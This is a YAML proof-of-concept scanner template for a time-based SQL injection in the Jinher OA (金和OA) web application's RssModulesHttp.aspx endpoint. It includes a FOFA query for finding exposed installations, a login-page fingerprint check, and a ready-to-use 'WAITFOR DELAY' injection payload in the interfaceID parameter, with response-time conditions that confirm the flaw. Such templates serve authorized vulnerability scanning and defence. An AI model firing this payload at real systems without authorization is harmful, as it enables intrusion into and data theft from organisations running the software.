id: poc-yaml-jinher-rssmoduleshttp-aspx-sqli
info:
  name: 金和OA RssModulesHttp.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 +1
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"c6/Jhsoft.Web.login")
- method: GET
  path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    !contains(body,"<") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
